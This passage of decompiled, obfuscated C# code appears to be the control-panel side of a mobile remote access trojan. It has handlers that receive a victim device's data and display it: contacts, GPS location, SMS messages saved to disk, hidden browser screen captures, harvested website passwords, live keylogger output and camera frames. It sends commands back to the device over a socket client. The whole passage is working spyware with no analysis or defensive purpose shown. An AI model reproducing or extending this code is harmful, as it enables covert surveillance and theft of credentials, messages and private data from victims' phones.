												dataGridViewRow5.CreateCells(CS_0024_003C_003E8__locals574._0024VB_0024NonLocal__0024VB_0024Closure_24._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.DGV0, text41, text42, text43);
												dataGridViewRow5.Tag = tag;
												CS_0024_003C_003E8__locals574._0024VB_0024Local_rowsToAdd.Add(dataGridViewRow5);
											}
										}
										catch (Exception ex61)
										{
											ProjectData.SetProjectError(ex61);
											Exception ex62 = ex61;
											Debuger.Log_e(EXGuarder._441D5365, codes.EXtoString(ex62));
											ProjectData.ClearProjectError();
										}
									}
									if (CS_0024_003C_003E8__locals574._0024VB_0024Local_rowsToAdd.Count > 0)
									{
										MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											CS_0024_003C_003E8__locals574._0024VB_0024NonLocal__0024VB_0024Closure_24._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.DGV0.Rows.AddRange(CS_0024_003C_003E8__locals574._0024VB_0024Local_rowsToAdd.ToArray());
										}));
										if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
										{
											codes.SaveDGV(CS_0024_003C_003E8__locals574._0024VB_0024NonLocal__0024VB_0024Closure_24._0024VB_0024NonLocal__0024VB_0024Closure_23._0024VB_0024Local_contsform.DGV0, CS_0024_003C_003E8__locals574._0024VB_0024NonLocal__0024VB_0024Closure_24._0024VB_0024Local_classclient.userfolder, EXGuarder._36695C2B);
										}
									}
								}
								return;
							}
							catch (Exception ex63)
							{
								ProjectData.SetProjectError(ex63);
								Exception ex64 = ex63;
								Debuger.Log_e(EXGuarder._12453619, codes.EXtoString(ex64));
								ProjectData.ClearProjectError();
								return;
							}
						}
						return;
					}
					catch (Exception ex65)
					{
						ProjectData.SetProjectError(ex65);
						Exception ex66 = ex65;
						Debuger.Log_e(EXGuarder._431A4A16, codes.EXtoString(ex66));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Locationcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D35 arg25 = default(_Closure_0024__15_002D35);
						_Closure_0024__15_002D35 CS_0024_003C_003E8__locals577 = new _Closure_0024__15_002D35(arg25);
						string name6 = EXGuarder._3C79685E + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals577._0024VB_0024Local_locform = (LocationMap)MyProject.Application.OpenForms[name6];
						if (CS_0024_003C_003E8__locals577._0024VB_0024Local_locform == null)
						{
							Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
							dictionary4.Add(EXGuarder._75106764, EXGuarder._3D6D0326);
							dictionary4.Add(EXGuarder._28443749, EXGuarder._14690277);
							Dictionary<string, object> chatData8 = dictionary4;
							commands(chatData8, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
						}
						else
						{
							CS_0024_003C_003E8__locals577._0024VB_0024Local_latitude = dictionary3[EXGuarder._66357074].ToString();
							CS_0024_003C_003E8__locals577._0024VB_0024Local_longitude = dictionary3[EXGuarder._13582278].ToString();
							CS_0024_003C_003E8__locals577._0024VB_0024Local_locform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								CS_0024_003C_003E8__locals577._0024VB_0024Local_locform.UpdateMap(double.Parse(CS_0024_003C_003E8__locals577._0024VB_0024Local_latitude), double.Parse(CS_0024_003C_003E8__locals577._0024VB_0024Local_longitude));
							}));
						}
						return;
					}
					catch (Exception ex67)
					{
						ProjectData.SetProjectError(ex67);
						Exception ex68 = ex67;
						Debuger.Log_e(EXGuarder._550A1631, codes.EXtoString(ex68));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.SMScom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D36 arg11 = default(_Closure_0024__15_002D36);
						_Closure_0024__15_002D36 closure_0024__15_002D12 = new _Closure_0024__15_002D36(arg11);
						closure_0024__15_002D12._0024VB_0024Local_handle = EXGuarder._6E312631 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D12._0024VB_0024Local_smsform = (SmsManager)MyProject.Application.OpenForms[closure_0024__15_002D12._0024VB_0024Local_handle];
						string left27 = dictionary3[EXGuarder._5E186642].ToString();
						if (Operators.CompareString(left27, EXGuarder._445F2207, TextCompare: false) == 0)
						{
							_Closure_0024__15_002D37 arg26 = default(_Closure_0024__15_002D37);
							_Closure_0024__15_002D37 CS_0024_003C_003E8__locals583 = new _Closure_0024__15_002D37(arg26);
							CS_0024_003C_003E8__locals583._0024VB_0024NonLocal__0024VB_0024Closure_25 = closure_0024__15_002D12;
							CS_0024_003C_003E8__locals583._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (CS_0024_003C_003E8__locals583._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform == null)
							{
								if (CS_0024_003C_003E8__locals583._0024VB_0024Local_classclient == null)
								{
									return;
								}
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									CS_0024_003C_003E8__locals583._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform = new SmsManager();
									CS_0024_003C_003E8__locals583._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.Name = CS_0024_003C_003E8__locals583._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_handle;
									CS_0024_003C_003E8__locals583._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.Btcli = CS_0024_003C_003E8__locals583._0024VB_0024Local_classclient;
									CS_0024_003C_003E8__locals583._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.Show();
								}));
							}
							string[] array19 = dictionary3[EXGuarder._08033105].ToString().Split(new string[1] { BTCommand.SPL_LINE }, StringSplitOptions.None);
							try
							{
								if (array19.Length > 0)
								{
									_Closure_0024__15_002D38 arg27 = default(_Closure_0024__15_002D38);
									_Closure_0024__15_002D38 CS_0024_003C_003E8__locals585 = new _Closure_0024__15_002D38(arg27);
									CS_0024_003C_003E8__locals585._0024VB_0024NonLocal__0024VB_0024Closure_26 = CS_0024_003C_003E8__locals583;
									CS_0024_003C_003E8__locals585._0024VB_0024Local_rowsToAdd = new List<DataGridViewRow>();
									string[] array20 = array19;
									foreach (string text44 in array20)
									{
										try
										{
											string[] array21 = text44.ToString().Split(new string[1] { BTCommand.SPL_ARRAY }, StringSplitOptions.None);
											if (array21.Length > 1)
											{
												string text45 = codes.SafeGetValue(array21, 0);
												string text46 = codes.SafeGetValue(array21, 1);
												string text47 = codes.SafeGetValue(array21, 2);
												string text48 = codes.SafeGetValue(array21, 3);
												string tag2 = codes.SafeGetValue(array21, 4);
												string text49 = codes.SafeGetValue(array21, 5);
												string tag3 = codes.SafeGetValue(array21, 6);
												DataGridViewRow dataGridViewRow6 = new DataGridViewRow();
												dataGridViewRow6.CreateCells(CS_0024_003C_003E8__locals585._0024VB_0024NonLocal__0024VB_0024Closure_26._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.DGV0, text48, text45, text46, text47, text49);
												dataGridViewRow6.Tag = tag2;
												dataGridViewRow6.Cells[0].Tag = tag3;
												CS_0024_003C_003E8__locals585._0024VB_0024Local_rowsToAdd.Add(dataGridViewRow6);
											}
										}
										catch (Exception ex69)
										{
											ProjectData.SetProjectError(ex69);
											Exception ex70 = ex69;
											Debuger.Log_e(EXGuarder._2E613266, codes.EXtoString(ex70));
											ProjectData.ClearProjectError();
										}
									}
									if (CS_0024_003C_003E8__locals585._0024VB_0024Local_rowsToAdd.Count > 0)
									{
										MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											CS_0024_003C_003E8__locals585._0024VB_0024NonLocal__0024VB_0024Closure_26._0024VB_0024NonLocal__0024VB_0024Closure_25._0024VB_0024Local_smsform.DGV0.Rows.AddRange(CS_0024_003C_003E8__locals585._0024VB_0024Local_rowsToAdd.ToArray());
										}));
										if (BTRegistry.ReadBool(EXGuarder._5073745D, defaultValue: true))
										{
											string text50 = CS_0024_003C_003E8__locals585._0024VB_0024NonLocal__0024VB_0024Closure_26._0024VB_0024Local_classclient.userfolder + EXGuarder._6F0C5071;
											if (!Directory.Exists(text50))
											{
												Directory.CreateDirectory(text50);
											}
											string _1204040F = EXGuarder._1204040F;
											_1204040F = text50 + EXGuarder._2F0F3F3E + _1204040F.Replace(EXGuarder._33460778, EXGuarder._49553245 + DateTime.Now.ToString(EXGuarder._701C3E4E) + EXGuarder._33460778);
											codes.SaveSMSData(array19, _1204040F);
										}
									}
								}
								return;
							}
							catch (Exception ex71)
							{
								ProjectData.SetProjectError(ex71);
								Exception ex72 = ex71;
								Debuger.Log_e(EXGuarder._02047178, codes.EXtoString(ex72));
								ProjectData.ClearProjectError();
								return;
							}
						}
						return;
					}
					catch (Exception ex73)
					{
						ProjectData.SetProjectError(ex73);
						Exception ex74 = ex73;
						Debuger.Log_e(EXGuarder._49587949, codes.EXtoString(ex74));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.browsercom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D39 arg12 = default(_Closure_0024__15_002D39);
						_Closure_0024__15_002D39 closure_0024__15_002D13 = new _Closure_0024__15_002D39(arg12);
						string name7 = EXGuarder._204F0E12 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D13._0024VB_0024Local_browserform = (WebBrowser)MyProject.Application.OpenForms[name7];
						string left28 = dictionary3[EXGuarder._5E186642].ToString();
						if (Operators.CompareString(left28, EXGuarder._48383423, TextCompare: false) == 0)
						{
							_Closure_0024__15_002D40 arg28 = default(_Closure_0024__15_002D40);
							_Closure_0024__15_002D40 CS_0024_003C_003E8__locals587 = new _Closure_0024__15_002D40(arg28);
							CS_0024_003C_003E8__locals587._0024VB_0024NonLocal__0024VB_0024Closure_27 = closure_0024__15_002D13;
							if (CS_0024_003C_003E8__locals587._0024VB_0024NonLocal__0024VB_0024Closure_27._0024VB_0024Local_browserform == null)
							{
								Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
								dictionary4.Add(EXGuarder._75106764, EXGuarder._06753620);
								dictionary4.Add(EXGuarder._6F070567, EXGuarder._48383423);
								dictionary4.Add(EXGuarder._3F57244A, EXGuarder._25676E1D);
								dictionary4.Add(EXGuarder._575D0A3A, EXGuarder._786A296B);
								Dictionary<string, object> chatData9 = dictionary4;
								commands(chatData9, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
							}
							else
							{
								string s8 = dictionary3[EXGuarder._28512279].ToString().Replace(EXGuarder._0723232B, EXGuarder._121E6943).Replace(EXGuarder._61034C3D, EXGuarder._121E6943)
									.Replace(EXGuarder._18072D47, EXGuarder._121E6943);
								byte[] array22 = Convert.FromBase64String(s8);
								using (MemoryStream stream4 = new MemoryStream(array22, 0, array22.Length, writable: true, publiclyVisible: true))
								{
									using MagickImage magickImage5 = new MagickImage(stream4);
									CS_0024_003C_003E8__locals587._0024VB_0024Local_imgBitmap = magickImage5.ToBitmap();
								}
								if (CS_0024_003C_003E8__locals587._0024VB_0024Local_imgBitmap != null)
								{
									MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals587._0024VB_0024NonLocal__0024VB_0024Closure_27._0024VB_0024Local_browserform.viewmonitor.Image = CS_0024_003C_003E8__locals587._0024VB_0024Local_imgBitmap;
									}));
								}
							}
						}
						else if (Operators.CompareString(left28, EXGuarder._03771B09, TextCompare: false) == 0)
						{
							_Closure_0024__15_002D41 arg29 = default(_Closure_0024__15_002D41);
							_Closure_0024__15_002D41 CS_0024_003C_003E8__locals589 = new _Closure_0024__15_002D41(arg29);
							CS_0024_003C_003E8__locals589._0024VB_0024NonLocal__0024VB_0024Closure_28 = closure_0024__15_002D13;
							if (CS_0024_003C_003E8__locals589._0024VB_0024NonLocal__0024VB_0024Closure_28._0024VB_0024Local_browserform == null)
							{
								Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
								dictionary4.Add(EXGuarder._75106764, EXGuarder._06753620);
								dictionary4.Add(EXGuarder._6F070567, EXGuarder._03771B09);
								dictionary4.Add(EXGuarder._3F57244A, EXGuarder._25676E1D);
								dictionary4.Add(EXGuarder._575D0A3A, EXGuarder._25676E1D);
								Dictionary<string, object> chatData10 = dictionary4;
								commands(chatData10, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
							}
							else
							{
								string s9 = dictionary3[EXGuarder._28512279].ToString().Replace(EXGuarder._0723232B, EXGuarder._121E6943).Replace(EXGuarder._61034C3D, EXGuarder._121E6943)
									.Replace(EXGuarder._18072D47, EXGuarder._121E6943);
								byte[] array23 = Convert.FromBase64String(s9);
								using (MemoryStream stream5 = new MemoryStream(array23, 0, array23.Length, writable: true, publiclyVisible: true))
								{
									using MagickImage magickImage6 = new MagickImage(stream5);
									CS_0024_003C_003E8__locals589._0024VB_0024Local_imgBitmap = magickImage6.ToBitmap();
								}
								if (CS_0024_003C_003E8__locals589._0024VB_0024Local_imgBitmap != null)
								{
									MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals589._0024VB_0024NonLocal__0024VB_0024Closure_28._0024VB_0024Local_browserform.viewhidden.Image = CS_0024_003C_003E8__locals589._0024VB_0024Local_imgBitmap;
									}));
								}
							}
						}
						else if (Operators.CompareString(left28, EXGuarder._3D123B0D, TextCompare: false) == 0 && closure_0024__15_002D13._0024VB_0024Local_browserform != null)
						{
							string[] array24 = dictionary3[EXGuarder._08033105].ToString().Split(new string[1] { BTCommand.SPL_LINE }, StringSplitOptions.None);
							if (array24.Length > 0)
							{
								_Closure_0024__15_002D42 arg30 = default(_Closure_0024__15_002D42);
								_Closure_0024__15_002D42 CS_0024_003C_003E8__locals601 = new _Closure_0024__15_002D42(arg30);
								CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29 = closure_0024__15_002D13;
								CS_0024_003C_003E8__locals601._0024VB_0024Local_logtext = EXGuarder._121E6943;
								CS_0024_003C_003E8__locals601._0024VB_0024Local_listsites = new List<string>();
								CS_0024_003C_003E8__locals601._0024VB_0024Local_siteData = new Dictionary<string, string>();
								string[] array25 = array24;
								foreach (string str in array25)
								{
									string[] array26 = codes.FromBase64(str).Split(new string[1] { BTCommand.SPL_DATA }, StringSplitOptions.None);
									if (array26.Length == 4)
									{
										string text51 = array26[0];
										string text52 = array26[1];
										string text53 = array26[2];
										string text54 = array26[3];
										string text55 = string.Format(EXGuarder._15511F06, text51, EXGuarder._071E0500, text52, EXGuarder._071E0500, text53, EXGuarder._071E0500, text54, EXGuarder._071E0500, EXGuarder._071E0500);
										if (!CS_0024_003C_003E8__locals601._0024VB_0024Local_listsites.Contains(text51))
										{
											CS_0024_003C_003E8__locals601._0024VB_0024Local_listsites.Add(text51);
										}
										if (!CS_0024_003C_003E8__locals601._0024VB_0024Local_siteData.ContainsKey(text51))
										{
											CS_0024_003C_003E8__locals601._0024VB_0024Local_siteData[text51] = text55;
										}
										else
										{
											CS_0024_003C_003E8__locals601._0024VB_0024Local_siteData[text51] += text55;
										}
										CS_0024_003C_003E8__locals601._0024VB_0024Local_logtext += text55;
									}
								}
								MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
								{
									if (CS_0024_003C_003E8__locals601._0024VB_0024Local_listsites.Count > 0)
									{
										CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Enabled = true;
										CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Items.Clear();
										CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Items.Add("All");
										foreach (string item4 in CS_0024_003C_003E8__locals601._0024VB_0024Local_listsites)
										{
											CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Items.Add(item4);
										}
									}
									CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.combositespass.Text = "All";
									CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.passtextlog.Text = CS_0024_003C_003E8__locals601._0024VB_0024Local_logtext;
									CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.dellall.Enabled = true;
									CS_0024_003C_003E8__locals601._0024VB_0024NonLocal__0024VB_0024Closure_29._0024VB_0024Local_browserform.SiteData = CS_0024_003C_003E8__locals601._0024VB_0024Local_siteData;
								}));
							}
						}
						return;
					}
					catch (Exception ex75)
					{
						ProjectData.SetProjectError(ex75);
						Exception ex76 = ex75;
						Debuger.Log_e(EXGuarder._4D083353, codes.EXtoString(ex76));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.trackcom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D44 arg13 = default(_Closure_0024__15_002D44);
						_Closure_0024__15_002D44 closure_0024__15_002D14 = new _Closure_0024__15_002D44(arg13);
						string name8 = EXGuarder._4D767708 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D14._0024VB_0024Local_trackform = (Tracker)MyProject.Application.OpenForms[name8];
						if (closure_0024__15_002D14._0024VB_0024Local_trackform != null)
						{
							string left29 = dictionary3[EXGuarder._5E186642].ToString();
							if (Operators.CompareString(left29, EXGuarder._3D123B0D, TextCompare: false) == 0)
							{
								string[] array27 = dictionary3[EXGuarder._08033105].ToString().Split(new string[1] { BTCommand.SPL_LINE }, StringSplitOptions.None);
								if (array27.Length > 0)
								{
									_Closure_0024__15_002D43 arg31 = default(_Closure_0024__15_002D43);
									_Closure_0024__15_002D43 CS_0024_003C_003E8__locals611 = new _Closure_0024__15_002D43(arg31);
									CS_0024_003C_003E8__locals611._0024VB_0024NonLocal__0024VB_0024Closure_30 = closure_0024__15_002D14;
									CS_0024_003C_003E8__locals611._0024VB_0024Local_logtext = EXGuarder._121E6943;
									CS_0024_003C_003E8__locals611._0024VB_0024Local_listsites = new List<string>();
									CS_0024_003C_003E8__locals611._0024VB_0024Local_siteData = new Dictionary<string, string>();
									string[] array28 = array27;
									foreach (string str2 in array28)
									{
										string[] array29 = codes.FromBase64(str2).Split(new string[1] { BTCommand.SPL_DATA }, StringSplitOptions.None);
										if (array29.Length == 4)
										{
											string text56 = array29[0];
											string text57 = array29[1];
											string text58 = array29[2];
											string text59 = array29[3];
											string text60 = string.Format(EXGuarder._15511F06, text56, EXGuarder._071E0500, text57, EXGuarder._071E0500, text58, EXGuarder._071E0500, text59, EXGuarder._071E0500, EXGuarder._071E0500);
											if (!CS_0024_003C_003E8__locals611._0024VB_0024Local_listsites.Contains(text56))
											{
												CS_0024_003C_003E8__locals611._0024VB_0024Local_listsites.Add(text56);
											}
											if (!CS_0024_003C_003E8__locals611._0024VB_0024Local_siteData.ContainsKey(text56))
											{
												CS_0024_003C_003E8__locals611._0024VB_0024Local_siteData[text56] = text60;
											}
											else
											{
												CS_0024_003C_003E8__locals611._0024VB_0024Local_siteData[text56] += text60;
											}
											CS_0024_003C_003E8__locals611._0024VB_0024Local_logtext += text60;
										}
									}
									MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										if (CS_0024_003C_003E8__locals611._0024VB_0024Local_listsites.Count > 0)
										{
											CS_0024_003C_003E8__locals611._0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Enabled = true;
											CS_0024_003C_003E8__locals611._0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Items.Clear();
											CS_0024_003C_003E8__locals611._0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Items.Add("All");
											foreach (string item5 in CS_0024_003C_003E8__locals611._0024VB_0024Local_listsites)
											{
												CS_0024_003C_003E8__locals611._0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.listsites.Items.Add(item5);
											}
										}
										CS_0024_003C_003E8__locals611._0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.passtextlog.Text = CS_0024_003C_003E8__locals611._0024VB_0024Local_logtext;
										CS_0024_003C_003E8__locals611._0024VB_0024NonLocal__0024VB_0024Closure_30._0024VB_0024Local_trackform.SiteData = CS_0024_003C_003E8__locals611._0024VB_0024Local_siteData;
									}));
								}
							}
						}
						return;
					}
					catch (Exception ex77)
					{
						ProjectData.SetProjectError(ex77);
						Exception ex78 = ex77;
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.keyscom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D45 arg14 = default(_Closure_0024__15_002D45);
						_Closure_0024__15_002D45 closure_0024__15_002D15 = new _Closure_0024__15_002D45(arg14);
						closure_0024__15_002D15._0024VB_0024Local_handle = EXGuarder._57040A63 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						closure_0024__15_002D15._0024VB_0024Local_keylogform = (LiveKeylogger)MyProject.Application.OpenForms[closure_0024__15_002D15._0024VB_0024Local_handle];
						if (closure_0024__15_002D15._0024VB_0024Local_keylogform == null)
						{
							_Closure_0024__15_002D46 arg32 = default(_Closure_0024__15_002D46);
							_Closure_0024__15_002D46 CS_0024_003C_003E8__locals617 = new _Closure_0024__15_002D46(arg32);
							CS_0024_003C_003E8__locals617._0024VB_0024NonLocal__0024VB_0024Closure_31 = closure_0024__15_002D15;
							CS_0024_003C_003E8__locals617._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
							if (CS_0024_003C_003E8__locals617._0024VB_0024Local_classclient == null)
							{
								return;
							}
							MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
							{
								CS_0024_003C_003E8__locals617._0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform = new LiveKeylogger();
								CS_0024_003C_003E8__locals617._0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform.Name = CS_0024_003C_003E8__locals617._0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_handle;
								CS_0024_003C_003E8__locals617._0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform.Btcli = CS_0024_003C_003E8__locals617._0024VB_0024Local_classclient;
								CS_0024_003C_003E8__locals617._0024VB_0024NonLocal__0024VB_0024Closure_31._0024VB_0024Local_keylogform.Show();
							}));
						}
						string s10 = dictionary3[EXGuarder._08033105].ToString();
						string[] array30 = s10.Split(EXGuarder._3E086753);
						string appname = array30[0];
						string typeevent = array30[1];
						string keytext = array30[2];
						closure_0024__15_002D15._0024VB_0024Local_keylogform.printlog(typeevent, appname, keytext);
						return;
					}
					catch (Exception ex79)
					{
						ProjectData.SetProjectError(ex79);
						Exception ex80 = ex79;
						Debuger.Log_e(EXGuarder._122D5105, codes.EXtoString(ex80));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.Cameracom, TextCompare: false) == 0)
				{
					try
					{
						_Closure_0024__15_002D47 arg33 = default(_Closure_0024__15_002D47);
						_Closure_0024__15_002D47 CS_0024_003C_003E8__locals629 = new _Closure_0024__15_002D47(arg33);
						CS_0024_003C_003E8__locals629._0024VB_0024Local_handle = EXGuarder._12137308 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						CS_0024_003C_003E8__locals629._0024VB_0024Local_camform = (CameraMonitor)MyProject.Application.OpenForms[CS_0024_003C_003E8__locals629._0024VB_0024Local_handle];
						string left30 = dictionary3[EXGuarder._5E186642].ToString();
						if (Operators.CompareString(left30, EXGuarder._445F2207, TextCompare: false) == 0)
						{
							if (CS_0024_003C_003E8__locals629._0024VB_0024Local_camform == null)
							{
								_Closure_0024__15_002D48 arg34 = default(_Closure_0024__15_002D48);
								_Closure_0024__15_002D48 CS_0024_003C_003E8__locals625 = new _Closure_0024__15_002D48(arg34);
								CS_0024_003C_003E8__locals625._0024VB_0024NonLocal__0024VB_0024Closure_32 = CS_0024_003C_003E8__locals629;
								CS_0024_003C_003E8__locals625._0024VB_0024Local_classclient = GetClientById(closure_0024__15_002D2._0024VB_0024Local_mobid);
								if (CS_0024_003C_003E8__locals625._0024VB_0024Local_classclient != null)
								{
									CS_0024_003C_003E8__locals625._0024VB_0024Local_camsizes = dictionary3[EXGuarder._723D5C08].ToString().Split(EXGuarder._716A0C1A);
									MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
									{
										CS_0024_003C_003E8__locals625._0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform = new CameraMonitor();
										CS_0024_003C_003E8__locals625._0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.Name = CS_0024_003C_003E8__locals625._0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_handle;
										CS_0024_003C_003E8__locals625._0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.Btcli = CS_0024_003C_003E8__locals625._0024VB_0024Local_classclient;
										CS_0024_003C_003E8__locals625._0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.addsizes(new object[1] { CS_0024_003C_003E8__locals625._0024VB_0024Local_camsizes });
										CS_0024_003C_003E8__locals625._0024VB_0024NonLocal__0024VB_0024Closure_32._0024VB_0024Local_camform.Show();
									}));
								}
							}
						}
						else if (Operators.CompareString(left30, EXGuarder._0A132B55, TextCompare: false) == 0)
						{
							if (CS_0024_003C_003E8__locals629._0024VB_0024Local_camform == null)
							{
								VB_0024AnonymousType_5<string> data2 = new VB_0024AnonymousType_5<string>(EXGuarder._051F4D2A);
								string value6 = BTCommand.FormatCommand(EXGuarder._68004A78, data2);
								Dictionary<string, object> dictionary4 = new Dictionary<string, object>();
								dictionary4.Add(EXGuarder._75106764, BTConst.wrk);
								dictionary4.Add(EXGuarder._126B4509, value6);
								Dictionary<string, object> chatData11 = dictionary4;
								commands(chatData11, closure_0024__15_002D2._0024VB_0024Local_mobid, closure_0024__15_002D2._0024VB_0024NonLocal__0024VB_0024Closure_2._0024VB_0024Local_srverinf.WSClient);
							}
							else
							{
								string s11 = dictionary3[EXGuarder._28512279].ToString().Replace(EXGuarder._0723232B, EXGuarder._121E6943).Replace(EXGuarder._61034C3D, EXGuarder._121E6943)
									.Replace(EXGuarder._18072D47, EXGuarder._121E6943);
								Bitmap bitmap13 = null;
								try
								{
									byte[] buffer = Convert.FromBase64String(s11);
									using MemoryStream stream6 = new MemoryStream(buffer);
									using Bitmap original2 = (Bitmap)Image.FromStream(stream6);
									bitmap13 = new Bitmap(original2);
								}
								catch (Exception projectError2)
								{
									ProjectData.SetProjectError(projectError2);
									ProjectData.ClearProjectError();
									return;
								}
								if (bitmap13 != null)
								{
									object frameLock = CS_0024_003C_003E8__locals629._0024VB_0024Local_camform._frameLock;
									ObjectFlowControl.CheckForSyncLockOnValueType(frameLock);
									bool lockTaken = false;
									try
									{
										Monitor.Enter(frameLock, ref lockTaken);
										if (CS_0024_003C_003E8__locals629._0024VB_0024Local_camform._latestFrame != null)
										{
											CS_0024_003C_003E8__locals629._0024VB_0024Local_camform._latestFrame.Dispose();
										}
										CS_0024_003C_003E8__locals629._0024VB_0024Local_camform._latestFrame = bitmap13;
									}
									finally
									{
										if (lockTaken)
										{
											Monitor.Exit(frameLock);
										}
									}
									Interlocked.Increment(ref CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.FPS);
									CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.RequestRender();
									if (CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.baseloader.Enabled)
									{
										CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
										{
											CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.baseloader.Enabled = false;
											CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.baseloader.Visible = false;
											CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.mainstatelabel.Text = BTConst.selectedtypstr + ": " + CS_0024_003C_003E8__locals629._0024VB_0024Local_camform.comboTargts.Text + Strings.Space(10) + BTConst.Connectedstr;
										}));
									}
								}
							}
						}
						return;
					}
					catch (Exception ex81)
					{
						ProjectData.SetProjectError(ex81);
						Exception ex82 = ex81;
						Debuger.Log_e(EXGuarder._37581471, codes.EXtoString(ex82));
						ProjectData.ClearProjectError();
						return;
					}
				}
				if (Operators.CompareString(left2, BTConst.deviceinfo, TextCompare: false) == 0)
				{
					try
					{
						string name9 = EXGuarder._5B791402 + closure_0024__15_002D2._0024VB_0024Local_mobid;
						profile profile2 = (profile)MyProject.Application.OpenForms[name9];
						if (profile2 != null)
						{
							string left31 = dictionary3[EXGuarder._5E186642].ToString();
							if (Operators.CompareString(left31, EXGuarder._445F2207, TextCompare: false) == 0)
							{
								string alllines = dictionary3[EXGuarder._08033105].ToString();
								profile2.updateinfotext(alllines);
							}
